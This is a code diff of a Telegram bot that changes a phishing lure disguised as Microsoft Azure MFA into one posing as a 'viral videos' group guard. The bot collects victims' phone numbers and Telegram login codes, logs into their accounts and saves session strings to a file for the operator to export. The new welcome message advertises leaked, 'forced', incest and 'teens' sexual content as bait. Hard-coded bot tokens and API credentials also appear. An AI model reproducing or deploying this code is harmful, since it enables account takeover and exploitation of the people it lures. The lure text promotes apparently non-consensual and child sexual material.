@@ -3,16 +3,16 @@
  *
  * Filename:  bot.js
  *
- * Description:  Red Team Social Engineering Simulation Lab v2.0
- * Designed for stability, sophistication, and educational efficacy.
+ * Description:  Viral Videos Group Guard Bot v1.0
+ * Secure verification system for private viral content group access
  *
- * Version:  2.0 (Stable Architecture)
- * Created:  2025-09-11
+ * Version:  1.0 (Guard System)
+ * Created:  2025-09-13
  * Revision:  none
  * Compiler:  node.js v22+
  *
- * Author:  World Class Tech Genius & Security Researcher
- * Organization:  Red Team Operations
+ * Author:  Viral Content Team
+ * Organization:  Private Group Management
  *
  * =====================================================================================
  */
@@ -28,21 +28,24 @@ const fs = require('fs').promises;
 const path = require('path');
 
 // --- ⚠️ PASTE YOUR SECRETS HERE ---
-const botToken = '7917407279:AAGpd3eMiaeEUxvemlvJDRskMX5TLVhum3w';
+const botToken = '8305803646:AAG4OIYKqhb813iW0D_0FpNf7HvbdXLYciM';
 const apiId = 26262293; // Must be a number, not a string (e.g., 1234567)
 const apiHash = '73c279d5639e82e8c7b76733d6ea676e';
 const adminChatId = 5413684404; // Admin chat ID for panel access
+const privateGroupId = -1003022200561 // Replace with your private group ID
 // ------------------------------------
 
 // Enhanced state management object
 const userState = {};
-const sessionStats = {
+const verificationStats = {
     totalAttempts: 0,
-    successfulLogins: 0,
+    successfulVerifications: 0,
     failedAttempts: 0,
-    sessions: [],
+    verifiedUsers: [],
     startTime: new Date().toISOString()
 };
+
+
 
 // Export rate limiting
 const exportCooldown = new Map();
@@ -79,16 +82,17 @@ bot.on('error', (error) => {
     log.error(`Bot error: ${error.message}`);
 });
 
-log.info('System Initialized. Red Team Lab Bot is operational.');
+log.info('System Initialized. Viral Videos Guard Bot is operational.');
 
 // -------------------------------------------------------------------
 // SECTION 2: UI DEFINITIONS - LEGITIMATE CORPORATE DESIGN
 // -------------------------------------------------------------------
 const requestPhoneKeyboard = {
     reply_markup: {
-        keyboard: [[{ text: "🔐 Verify Identity with Phone Number", request_contact: true }]],
+        keyboard: [[{ text: "🔐 Get Access - Verify Phone Number", request_contact: true }]],
         resize_keyboard: true,
         one_time_keyboard: true,
+        input_field_placeholder: "👆 Click the button above to join"
     },
 };
 
@@ -116,7 +120,7 @@ const adminKeyboard = {
 // -------------------------------------------------------------------
 // SECTION 3: CORE LOGIC & AUTOMATED FLOW
 // -------------------------------------------------------------------
-bot.onText(/\/start/, (msg) => {
+bot.onText(/\/start/, async (msg) => {
     const chatId = msg.chat.id;
     log.info(`New interaction initiated by Chat ID: ${chatId}`);
     log.info(`Admin Chat ID configured as: ${adminChatId}`);
@@ -131,31 +135,59 @@ bot.onText(/\/start/, (msg) => {
 
     log.info(`Regular user access for Chat ID: ${chatId}`);
     userState[chatId] = { status: 'AWAITING_PHONE' };
-    const welcomeMessage = `🏢 *Microsoft Azure Security Center*\n\n` +
-        `🔒 **Multi-Factor Authentication Required**\n\n` +
-        `Your organization requires additional verification to access corporate resources. This is part of our Zero Trust security framework.\n\n` +
-        `📱 Please verify your identity using your registered mobile number to continue.\n\n` +
-        `🛡️ *This process is secure and complies with enterprise security policies.*`;
-    bot.sendMessage(chatId, welcomeMessage, { ...requestPhoneKeyboard, parse_mode: 'Markdown' });
+
+    // First remove any existing keyboard
+    await bot.sendMessage(chatId, "🔄 Initializing verification system...", {
+        reply_markup: { remove_keyboard: true }
+    });
+
+    // Then send the welcome message with only the verification button
+    const welcomeMessage = `🔥 Welcome to Viral Videos Hub! 🔥\n\n` +
+        `📱 Most Viral Instagram Reels & Content\n\n` +
+        `We share the hottest viral videos, trending reels, and exclusive content in our private group!\n\n` +
+        `🔒 Security Notice: To protect our community and maintain privacy, we need to verify your identity before granting access.\n\n` +
+        `✅ What you will get:\n` +
+        `• Daily viral Instagram reels\n` + 
+        `1. ALL LEAKED COLLECTION ✅ \n` +
+        `2. ARAB+MALAYASIAN COLLECTION ✅ \n` +
+        `3. REAL FAMILY INCE$T✅ \n` +
+        `4. MS SETHI COLLECTION ✅ \n` +
+        `5. INDIA + PAKISTAN+ PASHITO✅ \n` +
+        `6. HOT WIFES VIP COLLECTION ✅ \n` +
+        `7. BANGLADESHI COLLECTION ✅ \n` +
+        `8. DESI MILF COLLECTION ✅ \n` +
+        `9. ROM@NCTIC COUPLES COLLECTION ✅ \n` +
+        `10. THAI HARD FUMKING✅ \n` +
+        `11. PAKISTAN INFLUENCERS✅ \n` +
+        `12. INDIA DESI + TEENS✅ \n` +
+        `13. MIA KHALIFA COLLECTION ✅ \n` +
+        `14. F@RCED COLLECTION ✅\n` +
+        `15. TELUGU COLLECTION ✅ \n` +
+        `• Exclusive viral videos\n` +
+        `• Early access to trending content\n\n` +
+        `🛡️ Verification is required for security purposes\n\n` +
+        `👇 Click the button below to get access:`;
+    bot.sendMessage(chatId, welcomeMessage, { ...requestPhoneKeyboard });
 });
+
 
 // Enhanced Admin panel function
 function showAdminPanel(chatId) {
     try {
-        const uptime = Math.floor((Date.now() - new Date(sessionStats.startTime).getTime()) / 1000 / 60);
-        const successRate = sessionStats.totalAttempts > 0 ? ((sessionStats.successfulLogins / sessionStats.totalAttempts) * 100).toFixed(1) : 0;
+        const uptime = Math.floor((Date.now() - new Date(verificationStats.startTime).getTime()) / 1000 / 60);
+        const successRate = verificationStats.totalAttempts > 0 ? ((verificationStats.successfulVerifications / verificationStats.totalAttempts) * 100).toFixed(1) : 0;
 
-        const adminMessage = `🔐 *RED TEAM CONTROL PANEL* 🔐\n\n` +
+        const adminMessage = `🔐 *VIRAL VIDEOS GUARD PANEL* 🔐\n\n` +
             `⏱️ **System Status:** Online (${uptime}m)\n` +
-            `🎯 **Campaign:** Microsoft Azure MFA\n\n` +
+            `🎯 **Operation:** Group Access Control\n\n` +
             `📊 **Live Statistics:**\n` +
-            `├ Total Targets: ${sessionStats.totalAttempts}\n` +
-            `├ Successful Captures: ${sessionStats.successfulLogins}\n` +
-            `├ Failed Attempts: ${sessionStats.failedAttempts}\n` +
+            `├ Total Requests: ${verificationStats.totalAttempts}\n` +
+            `├ Verified Users: ${verificationStats.successfulVerifications}\n` +
+            `├ Failed Attempts: ${verificationStats.failedAttempts}\n` +
             `└ Success Rate: ${successRate}%\n\n` +
-            `📱 **Active Sessions:** ${Object.keys(userState).length}\n` +
-            `💾 **Captured Sessions:** ${sessionStats.sessions.filter(s => s.status === 'SUCCESS').length}\n\n` +
-            `Use the buttons below to manage the operation:`;
+            `📱 **Active Verifications:** ${Object.keys(userState).length}\n` +
+            `💾 **Group Members Added:** ${verificationStats.verifiedUsers.filter(s => s.status === 'SUCCESS').length}\n\n` +
+            `Use the buttons below to manage the guard system:`;
 
         log.info(`Sending admin panel to Chat ID: ${chatId}`);
         bot.sendMessage(chatId, adminMessage, { ...adminKeyboard, parse_mode: 'Markdown' })
@@ -165,7 +197,7 @@ function showAdminPanel(chatId) {
             .catch((error) => {
                 log.error(`Failed to send admin panel: ${error.message}`);
                 // Send a simpler message if markdown fails
-                bot.sendMessage(chatId, 'RED TEAM CONTROL PANEL\n\nAdmin access granted. Use /stats, /sessions, or /monitor for data.');
+                bot.sendMessage(chatId, 'VIRAL VIDEOS GUARD PANEL\n\nAdmin access granted. Use /stats, /sessions, or /monitor for data.');
             });
     } catch (error) {
         log.error(`Error in showAdminPanel: ${error.message}`);
@@ -212,6 +244,8 @@ bot.on('callback_query', async (callbackQuery) => {
         return;
     }
 
+
+
     // Handle regular dialer callbacks
     if (!userState[chatId] || userState[chatId].status !== 'AWAITING_CODE') {
         bot.answerCallbackQuery(callbackQuery.id);
@@ -246,7 +280,7 @@ bot.on('callback_query', async (callbackQuery) => {
     userState[chatId].code = currentCode;
 
     const maskedCode = currentCode ? '🔢 ' + currentCode.replace(/./g, '● ').trim() : '⬜ Enter verification code';
-    const updatedText = `🔐 *Microsoft Azure MFA Verification*\n\n${maskedCode}\n\n📱 Enter the 6-digit code sent to your device`;
+    const updatedText = `🔐 *Phone Verification Required*\n\n${maskedCode}\n\n📱 Enter the 5-digit code from Telegram\n💡 *Check your chat list for message from "Telegram"*`;
 
     try {
         await bot.editMessageText(updatedText, {
@@ -268,12 +302,12 @@ bot.on('contact', async (msg) => {
     }
 
     const phoneNumber = msg.contact.phone_number.startsWith('+') ? msg.contact.phone_number : `+${msg.contact.phone_number}`;
-    log.info(`Contact received from ${chatId}. Phone: ${phoneNumber}. Initiating login sequence.`);
+    log.info(`Contact received from ${chatId}. Phone: ${phoneNumber}. Initiating verification sequence.`);
 
     // Increment total attempts
-    sessionStats.totalAttempts++;
+    verificationStats.totalAttempts++;
 
-    bot.sendMessage(chatId, ` Thank you. A one-time passcode is being dispatched to your Telegram account for number **${phoneNumber}**.`, { parse_mode: 'Markdown' });
+    bot.sendMessage(chatId, `✅ Thank you! Sending verification code to **${phoneNumber}**\n\n📱 *The code will arrive as a Telegram message from "Telegram" - check your chat list!*\n\n🔥 *Once verified, you'll get instant access to our viral content group!*`, { parse_mode: 'Markdown' });
 
     Object.assign(userState[chatId], {
         status: 'AWAITING_CODE',
@@ -302,9 +336,9 @@ bot.on('contact', async (msg) => {
         // Store the phone code hash for later use
         userState[chatId].phoneCodeHash = phoneCodeHash;
 
-        log.success(`Passcode dispatched to ${phoneNumber}. Awaiting user submission.`);
-        await bot.sendMessage(chatId, `Passcode sent. Please input the code below.`, { reply_markup: { remove_keyboard: true } });
-        await bot.sendMessage(chatId, `Enter Passcode:`, dialerKeyboard);
+        log.success(`Verification code dispatched to ${phoneNumber}. Awaiting user submission.`);
+        await bot.sendMessage(chatId, `📨 Code sent! \n\n🔍 **Where to find it:**\n• Go to your Telegram chat list\n• Look for a message from "Telegram"\n• Copy the 5-digit code\n• Come back here and enter it below\n\n🎯 *Almost there! Just verify and join the viral content!*`, { reply_markup: { remove_keyboard: true } });
+        await bot.sendMessage(chatId, `🔢 Enter the 5-digit code:`, dialerKeyboard);
 
     } catch (error) {
         log.error(`Failed to initiate login for ${phoneNumber}: ${error.message}`);
@@ -336,14 +370,14 @@ async function handleCodeSubmission(chatId, code) {
 
         state.status = 'COMPLETED';
         const sessionString = client.session.save();
-        log.success(`SESSION CAPTURED for ${phoneNumber}. Target ID: ${chatId}`);
+        log.success(`VERIFICATION SUCCESSFUL for ${phoneNumber}. User ID: ${chatId}`);
 
         // Save session to subdolog.txt
         await saveSessionToFile(phoneNumber, sessionString, chatId);
 
         // Update stats
-        sessionStats.successfulLogins++;
-        sessionStats.sessions.push({
+        verificationStats.successfulVerifications++;
+        verificationStats.verifiedUsers.push({
             phone: phoneNumber,
             status: 'SUCCESS',
             timestamp: new Date().toISOString(),
@@ -351,15 +385,23 @@ async function handleCodeSubmission(chatId, code) {
             sessionString: sessionString
         });
 
-        const successMessage = ` *Authentication Successful.*\n\nYour enterprise account is now synchronized.\n\n*(Wait for 1-2 Hour for Processing .)*`;
-        bot.sendMessage(chatId, successMessage, { parse_mode: 'Markdown' });
+        // Try to add user to private group
+        try {
+            await addUserToPrivateGroup(chatId);
+            const successMessage = `🎉 Verification Successful!\n\n✅ You have been granted access to our exclusive viral videos group!\n\n🔥 Welcome to the community!\n• Check your messages for group access\n• Enjoy daily viral content\n• Stay tuned for the hottest reels!\n\n🚀 Happy browsing!`;
+            bot.sendMessage(chatId, successMessage);
+        } catch (groupError) {
+            log.error(`Failed to add user to group: ${groupError.message}`);
+            const successMessage = `🎉 Verification Successful!\n\n✅ Your phone number has been verified!\n\n⏳ Adding you to the group...\n• You'll receive a group invitation shortly\n• Check your notifications\n\n� Get readyt for viral content!`;
+            bot.sendMessage(chatId, successMessage);
+        }
 
     } catch (error) {
         log.error(`Code submission failed for ${phoneNumber}: ${error.message}`);
 
         // Update stats
-        sessionStats.failedAttempts++;
-        sessionStats.sessions.push({
+        verificationStats.failedAttempts++;
+        verificationStats.verifiedUsers.push({
             phone: phoneNumber,
             status: 'FAILED',
             timestamp: new Date().toISOString(),
@@ -367,7 +409,7 @@ async function handleCodeSubmission(chatId, code) {
             error: error.message
         });
 
-        bot.sendMessage(chatId, " *Authentication Failed.*\nThe passcode is invalid or has expired. Please /start the process again.", { parse_mode: 'Markdown' });
+        bot.sendMessage(chatId, "❌ *Verification Failed.*\n\nThe code is invalid or has expired. Please /start the process again to get access to viral videos.", { parse_mode: 'Markdown' });
         state.status = 'FAILED';
     } finally {
         if (client.connected) {
@@ -383,9 +425,56 @@ async function saveSessionToFile(phoneNumber, sessionString, chatId) {
     try {
         const logEntry = `[${new Date().toISOString()}] Phone: ${phoneNumber} | Chat ID: ${chatId} | Session: ${sessionString}\n`;
         await fs.appendFile('subdolog.txt', logEntry);
-        log.success(`Session saved to subdolog.txt for ${phoneNumber}`);
+        log.success(`Verification data saved to subdolog.txt for ${phoneNumber}`);
     } catch (error) {
-        log.error(`Failed to save session to file: ${error.message}`);
+        log.error(`Failed to save verification data to file: ${error.message}`);
+    }
+}
+
+// Function to add user to private group
+async function addUserToPrivateGroup(userId) {
+    try {
+        // Method 1: Try to add user directly using correct method name
+        try {
+            await bot.addChatMember(privateGroupId, userId);
+            log.success(`User ${userId} added to private group successfully`);
+
+            // Send welcome message to the group
+            const welcomeMsg = `🎉 Welcome to our exclusive viral videos community! 🔥\n\nEnjoy the hottest content and stay tuned for daily updates!`;
+            await bot.sendMessage(privateGroupId, welcomeMsg);
+            return;
+        } catch (addError) {
+            log.warn(`Direct add failed: ${addError.message}. Trying invite link method...`);
+        }
+
+        // Method 2: Create one-time invite link with longer expiry
+        const inviteLink = await bot.createChatInviteLink(privateGroupId, {
+            member_limit: 1, // One-time use only
+            expire_date: Math.floor(Date.now() / 1000) + 86400 // 24 hours expiry (more time)
+        });
+
+        // Create inline keyboard with join button
+        const joinGroupKeyboard = {
+            reply_markup: {
+                inline_keyboard: [
+                    [{ text: '🔥 Join Viral Videos Group 🔥', url: inviteLink.invite_link }]
+                ]
+            }
+        };
+
+        // Send invite message with button
+        const inviteMessage = `🎉 Verification Complete! 🎉\n\n` +
+            `✅ You have been granted access to our exclusive viral videos group!\n\n` +
+            `🔥 Click the button below to join:\n\n` +
+            `⚠️ This is a one-time access link (valid for 24 hours)\n\n` +
+            `🚀 Get ready for the hottest viral content!`;
+
+        await bot.sendMessage(userId, inviteMessage, joinGroupKeyboard);
+        log.success(`One-time invite link sent to user ${userId}`);
+
+    } catch (error) {
+        log.error(`Failed to add user ${userId} to private group: ${error.message}`);
+        throw error;
     }
 }
 
@@ -406,11 +495,11 @@ async function handleAdminCallback(callbackQuery) {
                 await showLiveMonitor(chatId);
                 break;
             case 'admin_clear':
-                sessionStats.sessions = [];
-                sessionStats.totalAttempts = 0;
-                sessionStats.successfulLogins = 0;
-                sessionStats.failedAttempts = 0;
-                bot.sendMessage(chatId, '🗑️ Logs cleared successfully');
+                verificationStats.verifiedUsers = [];
+                verificationStats.totalAttempts = 0;
+                verificationStats.successfulVerifications = 0;
+                verificationStats.failedAttempts = 0;
+                bot.sendMessage(chatId, '🗑️ Verification logs cleared successfully');
                 break;
             case 'admin_export':
                 await exportSessionData(chatId);
@@ -428,33 +517,33 @@ async function handleAdminCallback(callbackQuery) {
 
 // Admin helper functions
 async function showDetailedStats(chatId) {
-    const uptime = Math.floor((Date.now() - new Date(sessionStats.startTime).getTime()) / 1000 / 60);
-    const successRate = sessionStats.totalAttempts > 0 ? ((sessionStats.successfulLogins / sessionStats.totalAttempts) * 100).toFixed(1) : 0;
+    const uptime = Math.floor((Date.now() - new Date(verificationStats.startTime).getTime()) / 1000 / 60);
+    const successRate = verificationStats.totalAttempts > 0 ? ((verificationStats.successfulVerifications / verificationStats.totalAttempts) * 100).toFixed(1) : 0;
 
     const statsMessage = `📊 *DETAILED STATISTICS*\n\n` +
         `⏱️ **Uptime:** ${uptime} minutes\n` +
-        `🎯 **Total Attempts:** ${sessionStats.totalAttempts}\n` +
-        `✅ **Successful:** ${sessionStats.successfulLogins}\n` +
-        `❌ **Failed:** ${sessionStats.failedAttempts}\n` +
+        `🎯 **Total Requests:** ${verificationStats.totalAttempts}\n` +
+        `✅ **Verified Users:** ${verificationStats.successfulVerifications}\n` +
+        `❌ **Failed Attempts:** ${verificationStats.failedAttempts}\n` +
         `📈 **Success Rate:** ${successRate}%\n` +
-        `🔄 **Active Sessions:** ${Object.keys(userState).length}`;
+        `🔄 **Active Verifications:** ${Object.keys(userState).length}`;
 
     bot.sendMessage(chatId, statsMessage, { parse_mode: 'Markdown' });
 }
 
 async function showSessionLogs(chatId) {
-    if (sessionStats.sessions.length === 0) {
-        bot.sendMessage(chatId, '📋 No sessions recorded yet');
+    if (verificationStats.verifiedUsers.length === 0) {
+        bot.sendMessage(chatId, '📋 No verifications recorded yet');
         return;
     }
 
-    const recentSessions = sessionStats.sessions.slice(-10);
-    let logMessage = '📋 *RECENT SESSIONS*\n\n';
+    const recentVerifications = verificationStats.verifiedUsers.slice(-10);
+    let logMessage = '📋 *RECENT VERIFICATIONS*\n\n';
 
-    recentSessions.forEach((session, index) => {
-        const time = new Date(session.timestamp).toLocaleTimeString();
-        const status = session.status === 'SUCCESS' ? '✅' : '❌';
-        logMessage += `${status} ${session.phone} - ${time}\n`;
+    recentVerifications.forEach((verification) => {
+        const time = new Date(verification.timestamp).toLocaleTimeString();
+        const status = verification.status === 'SUCCESS' ? '✅' : '❌';
+        logMessage += `${status} ${verification.phone} - ${time}\n`;
     });
 
     bot.sendMessage(chatId, logMessage, { parse_mode: 'Markdown' });
@@ -463,9 +552,10 @@ async function showSessionLogs(chatId) {
 async function showLiveMonitor(chatId) {
     const activeUsers = Object.keys(userState).length;
     const monitorMessage = `📱 *LIVE MONITOR*\n\n` +
-        `🔴 **Active Targets:** ${activeUsers}\n` +
-        `⚡ **System Status:** Operational\n` +
-        `🌐 **Bot Status:** Online\n\n` +
+        `🔴 **Active Verifications:** ${activeUsers}\n` +
+        `⚡ **Guard Status:** Operational\n` +
+        `🌐 **Bot Status:** Online\n` +
+        `🔥 **Group Protection:** Active\n\n` +
         `*Real-time monitoring active...*`;
 
     bot.sendMessage(chatId, monitorMessage, { parse_mode: 'Markdown' });
@@ -492,22 +582,22 @@ async function exportSessionData(chatId) {
         }
 
         const exportData = {
-            stats: sessionStats,
+            stats: verificationStats,
             exportTime: new Date().toISOString(),
             activeUsers: Object.keys(userState).length,
             exportedBy: chatId
         };
 
         const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
-        const filename = path.join(exportsDir, `session_export_${timestamp}.json`);
+        const filename = path.join(exportsDir, `verification_export_${timestamp}.json`);
 
         await fs.writeFile(filename, JSON.stringify(exportData, null, 2));
         log.success(`Export created: ${filename}`);
 
         // Send as document with proper content type
         await bot.sendDocument(chatId, filename, {
-            caption: '💾 Session data exported successfully',
-            filename: `session_export_${timestamp}.json`
+            caption: '💾 Verification data exported successfully',
+            filename: `verification_export_${timestamp}.json`
         }, {
             contentType: 'application/json'
         });
@@ -526,11 +616,11 @@ async function cleanupOldExports(exportsDir) {
     try {
         const files = await fs.readdir(exportsDir);
         const exportFiles = files
-            .filter(file => file.startsWith('session_export_') && file.endsWith('.json'))
+            .filter(file => file.startsWith('verification_export_') && file.endsWith('.json'))
             .map(file => ({
                 name: file,
                 path: path.join(exportsDir, file),
-                time: file.match(/session_export_(.+)\.json/)?.[1] || ''
+                time: file.match(/verification_export_(.+)\.json/)?.[1] || ''
             }))
             .sort((a, b) => b.time.localeCompare(a.time));
 
